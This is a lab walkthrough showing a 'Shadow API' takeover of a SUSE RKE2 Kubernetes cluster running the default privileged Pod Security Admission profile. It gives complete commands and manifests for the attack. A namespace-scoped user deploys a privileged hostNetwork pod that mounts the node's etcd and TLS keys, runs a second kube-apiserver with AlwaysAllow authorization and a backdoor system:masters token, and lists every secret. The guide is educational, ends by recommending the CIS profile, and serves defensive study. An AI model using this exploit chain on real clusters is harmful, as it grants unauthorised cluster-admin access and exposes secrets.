# Lab: Shadow API Takeover on SUSE RKE2

This guide demonstrates how the "Shadow API" takeover is replicated on **SUSE RKE2**. While RKE2 is "hardened by default," its security posture depends entirely on the selected installation **profile**.

### The Default vs. CIS Trade-off

By default, RKE2 prioritizes usability, meaning it ships with a **Pod Security Admission (PSA)** level of `privileged`. Every namespace is wide open for exploitation by default.

* **Default Profile:** Enforces `privileged` globally. Any user with pod-creation rights can mount host paths and hijack the control plane.
* **CIS Profile (`cis-1.x`):** Enforces `restricted` globally. The attack below would be **immediately blocked**.

---

## Phase 0: Infrastructure Setup (The Lab Environment)

We use **Lima** on macOS to create an Ubuntu environment for RKE2.

### 1. Create the Ubuntu VM

```bash
# From your Mac Terminal
brew install lima
limactl start template://ubuntu --name=rke2-lab
limactl shell rke2-lab

```

### 2. Install RKE2

Inside the Lima shell, install and start the RKE2 server:

```bash
curl -sfL https://get.rke2.io | sudo sh -
sudo systemctl enable rke2-server.service
sudo systemctl start rke2-server.service

# Link kubectl and fix config permissions
sudo ln -s /var/lib/rancher/rke2/bin/kubectl /usr/local/bin/kubectl
sudo chmod 644 /etc/rancher/rke2/rke2.yaml
export KUBECONFIG=/etc/rancher/rke2/rke2.yaml
echo 'export KUBECONFIG=/etc/rancher/rke2/rke2.yaml' >> ~/.bashrc

```

### 3. Check Global RKE2 Configuration

RKE2 stores its PSA defaults in a specific admission configuration file. You can see the global default by inspecting this file on the host.

```bash
# Check the default PSA levels enforced by RKE2
sudo cat /etc/rancher/rke2/rke2-pss.yaml

```

**What to look for:**

* **`privileged`**: You are in the **Default Profile**. New namespaces will have no restrictions.
* **`restricted`**: You are in the **CIS Profile**. The cluster is hardened.


### 4. Provision the Restricted User & Namespace

We create a user (`dev-user`) and lock them into a single namespace (`dev-space`) with standard `edit` permissions.

```bash
# Create the Workspace
mkdir -p ~/users && cd ~/users

# Generate and Sign Certs
openssl genrsa -out dev-user.key 2048
openssl req -new -key dev-user.key -out dev-user.csr -subj "/CN=dev-user"
sudo openssl x509 -req -in dev-user.csr -CA /var/lib/rancher/rke2/server/tls/client-ca.crt -CAkey /var/lib/rancher/rke2/server/tls/client-ca.key -CAcreateserial -out dev-user.crt -days 365

# Create the restricted namespace and local RoleBinding
kubectl create namespace dev-space
cat <<EOF > dev-user-local-binding.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-user-restricted-binding
  namespace: dev-space
subjects:
- kind: User
  name: dev-user
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: edit
  apiGroup: rbac.authorization.k8s.io
EOF
kubectl apply -f dev-user-local-binding.yaml

# Generate the restricted Kubeconfig for the Attacker
export CLUSTER_CA=$(sudo cat /var/lib/rancher/rke2/server/tls/server-ca.crt | base64 -w 0)
export USER_CERT=$(cat dev-user.crt | base64 -w 0)
export USER_KEY=$(cat dev-user.key | base64 -w 0)

cat <<EOF > dev-user.config
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data: ${CLUSTER_CA}
    server: https://127.0.0.1:6443
  name: rke2-local
contexts:
- context:
    cluster: rke2-local
    namespace: dev-space
    user: dev-user
  name: dev-user-context
current-context: dev-user-context
users:
- name: dev-user
  user:
    client-certificate-data: ${USER_CERT}
    client-key-data: ${USER_KEY}
EOF

```

---

## Phase 1: Dynamic Reconnaissance

The attacker (`dev-user`) identifies the cluster version and node info to prepare the payload.

```bash
# 1. Format the RKE2 Image name (Fixes the versioning plus-sign issue)
export RAW_VERSION=$(kubectl --kubeconfig=dev-user.config version | grep 'Server Version' | awk '{print $3}')
export CLEAN_VERSION=$(echo $RAW_VERSION | sed 's/+/ /g' | awk '{print $1"-"$2}')
export API_IMAGE="rancher/hardened-kubernetes:${CLEAN_VERSION}-build20251210"

# 2. Deploy a probe pod to find the Service Range
kubectl --kubeconfig=dev-user.config run probe-pod --image=nginx -n dev-space
kubectl --kubeconfig=dev-user.config wait --for=condition=Ready pod/probe-pod --timeout=60s

export SVC_IP=$(kubectl --kubeconfig=dev-user.config exec probe-pod -n dev-space -- printenv KUBERNETES_SERVICE_HOST)
export SERVICE_RANGE=$(echo $SVC_IP | awk -F. '{print $1"."$2".0.0/16"}')

# 3. Identify Node Info via Pod Status (RBAC bypass for "get nodes")
export HOST_NAME=$(kubectl --kubeconfig=dev-user.config get pod probe-pod -n dev-space -o jsonpath='{.spec.nodeName}')
export HOST_IP=$(kubectl --kubeconfig=dev-user.config get pod probe-pod -n dev-space -o jsonpath='{.status.hostIP}')

```

---

## Phase 2: Deploy the Shadow API

The attacker exploits the **Privileged PSA** to mount the host's master credentials.

```bash
# 1. Create the Authentication Backdoor Token
cat <<EOF | kubectl --kubeconfig=dev-user.config apply -n dev-space -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: shadow-token-cm
data:
  token-file.csv: |
    shadow-token,shadow-admin,1000,"system:masters"
EOF

# 2. Launch the Shadow API Pod
cat <<EOF | kubectl --kubeconfig=dev-user.config apply -n dev-space -f -
apiVersion: v1
kind: Pod
metadata:
  name: rke2-shadow-api
  namespace: dev-space
spec:
  nodeSelector:
    kubernetes.io/hostname: ${HOST_NAME}
  hostNetwork: true
  containers:
  - name: shadow-api
    image: $API_IMAGE
    command: ["kube-apiserver"]
    args:
      - "--etcd-servers=https://127.0.0.1:2379"
      - "--etcd-cafile=/var/lib/rancher/rke2/server/tls/etcd/server-ca.crt"
      - "--etcd-certfile=/var/lib/rancher/rke2/server/tls/etcd/client.crt"
      - "--etcd-keyfile=/var/lib/rancher/rke2/server/tls/etcd/client.key"
      - "--etcd-prefix=/registry"
      - "--secure-port=16443"
      - "--authorization-mode=AlwaysAllow"
      - "--token-auth-file=/etc/shadow-token/token-file.csv"
      - "--allow-privileged=true"
      - "--service-account-issuer=https://kubernetes.default.svc.cluster.local"
      - "--service-account-key-file=/var/lib/rancher/rke2/server/tls/service.key"
      - "--service-account-signing-key-file=/var/lib/rancher/rke2/server/tls/service.current.key"
      - "--service-cluster-ip-range=$SERVICE_RANGE"
      - "--cert-dir=/tmp/shadow-certs"
      - "--advertise-address=$HOST_IP"
      - "--encryption-provider-config=/var/lib/rancher/rke2/server/cred/encryption-config.json"
    securityContext:
      privileged: true
    volumeMounts:
    - name: rke2-tls
      mountPath: /var/lib/rancher/rke2/server/tls
      readOnly: true
    - name: rke2-creds
      mountPath: /var/lib/rancher/rke2/server/cred
      readOnly: true
    - name: token-vol
      mountPath: /etc/shadow-token
  volumes:
  - name: rke2-tls
    hostPath:
      path: /var/lib/rancher/rke2/server/tls
  - name: rke2-creds
    hostPath:
      path: /var/lib/rancher/rke2/server/cred
  - name: token-vol
    configMap:
      name: shadow-token-cm
EOF

```

---

## Phase 3: Verification & Demo

The attacker uses the backdoor to act as a `system:masters` Cluster Admin.

```bash
# 1. Create a persistent client pod (rancher/shell includes kubectl)
cat <<EOF | kubectl --kubeconfig=dev-user.config apply -n dev-space -f -
apiVersion: v1
kind: Pod
metadata:
  name: shadow-client
  namespace: dev-space
spec:
  containers:
  - name: shell
    image: rancher/shell:v0.1.24
    command: ["sleep", "infinity"]
    env:
    - name: HOST_IP
      value: "${HOST_IP}"
EOF

kubectl --kubeconfig=dev-user.config get pods

# 2. Exec into the client (Variables are pre-baked into the environment)
kubectl --kubeconfig=dev-user.config exec -it shadow-client -n dev-space -- /bin/bash

# INSIDE THE POD: Authenticate using the backdoor token on Port 16443
kubectl --server=https://${HOST_IP}:16443 --token=shadow-token --insecure-skip-tls-verify get nodes
kubectl --server=https://${HOST_IP}:16443 --token=shadow-token --insecure-skip-tls-verify get secrets -A

```

---

### Final Step: Lab Clean Up

```bash
# 1. Delete the backdoor
kubectl delete ns dev-space

# 2. Harden the Cluster in /etc/rancher/rke2/config.yaml:
# profile: "cis-1.23"

```